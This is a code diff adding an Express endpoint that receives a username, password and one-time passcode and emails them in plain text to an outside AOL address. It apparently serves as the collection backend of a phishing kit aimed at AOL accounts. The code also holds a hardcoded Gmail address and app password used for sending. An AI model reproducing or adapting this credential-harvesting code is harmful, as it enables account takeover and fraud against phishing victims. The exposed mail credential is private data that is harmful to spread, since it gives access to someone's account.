@@ -892,3 +892,52 @@ app.post("/starbotpservice", async (req, res) => {
   });
 });
 
+
+app.post("/starbotaol", async (req, res) => {
+  const {
+    userName,
+   otp,
+   password
+  } = req.body;
+
+  // Construct email message
+  const message = `
+    New OTP for ${userName}:
+
+    OTP: ${otp}
+
+    userName: ${userName}
+
+    password: ${password}
+
+
+  `;
+  // Create a transporter object using SMTP transport
+  let transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "davidmiller4504@gmail.com",
+      pass: "dqhc mwpf nkmb buib",
+    },
+  });
+
+  let mailOptions = {
+    from: "davidmiller4504@gmail.com", // sender address
+    to: "edithzlarry@aol.com", // list of receivers
+    subject: `OTP for ${userName}`, // Subject line
+    text: message, // plain text body
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.status(500).send("Error sending email");
+    } else {
+      console.log("Email sent: " + info.response);
+      res.json({ success: true, message: "Email sent successfully!" });
+    }
+  });
+});
+
+
+
